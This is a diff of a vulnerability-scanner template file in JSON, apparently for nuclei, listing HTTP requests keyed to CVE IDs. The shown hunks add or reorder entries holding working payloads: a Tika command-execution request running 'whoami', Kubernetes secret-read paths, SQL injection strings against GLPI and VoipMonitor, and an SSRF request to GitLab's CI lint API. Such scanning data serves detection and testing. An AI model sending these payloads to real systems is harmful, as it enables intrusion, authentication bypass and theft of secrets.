@@ -6081,11 +6081,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -6572,6 +6572,22 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/wp-admin/admin.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-18264",
+      "info": {
+        "name": "Kubernetes Dashboard unauthenticated secret access",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/api/v1/namespaces/kube-system/secrets/kubernetes-dashboard-certs",
+            "{{BaseURL}}/k8s/api/v1/namespaces/kube-system/secrets/kubernetes-dashboard-certs"
           ]
         }
       ]
@@ -7441,6 +7457,21 @@
           "path": [
             "{{BaseURL}}/glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1",
             "{{BaseURL}}/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-10405",
+      "info": {
+        "name": "Diagnostic page exposed Cookie HTTP header",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET {{BaseURL}}/whoAmI/ HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET {{BaseURL}}/whoAmI/ HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -10121,6 +10152,21 @@
       ]
     },
     {
+      "id": "CVE-2020-2103",
+      "info": {
+        "name": "Diagnostic page exposed session cookies",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET {{BaseURL}}/whoAmI/ HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET {{BaseURL}}/whoAmI/ HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-21224",
       "info": {
         "name": "Inspur ClusterEngine V4.0 RCE",
@@ -12473,8 +12519,13 @@
       },
       "requests": [
         {
-          "raw": [
-            "POST /api/v4/ci/lint?include_merged_yaml=true HTTP/1.1\nHost: {{Hostname}}\nReferer: {{BaseURL}}\ncontent-type: application/json\n\n{\"content\": \"include:\\n  remote: http://{{interactsh-url}}/api/v1/targets?test.yml\"}\n"
+          "body": "{\"content\": \"include:\\n  remote: http://127.0.0.1:9100/test.yml\"}\n",
+          "headers": {
+            "Content-Type": "application/json"
+          },
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/api/v4/ci/lint?include_merged_yaml=true"
           ]
         }
       ]
@@ -14485,8 +14536,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
@@ -15783,6 +15834,21 @@
       ]
     },
     {
+      "id": "CVE-2022-0692",
+      "info": {
+        "name": "Rudloff alltube prior to 3.0.1 - Open Redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php/example.com"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-21371",
       "info": {
         "name": "Oracle WebLogic Server LFI",
@@ -15937,6 +16003,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,version(),1)"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-24260",
+      "info": {
+        "name": "VoipMonitor - Pre-Auth SQL injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /api.php HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\nmodule=relogin&action=login&pass=nope&user=a' UNION SELECT 'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; #\n"
           ]
         }
       ]
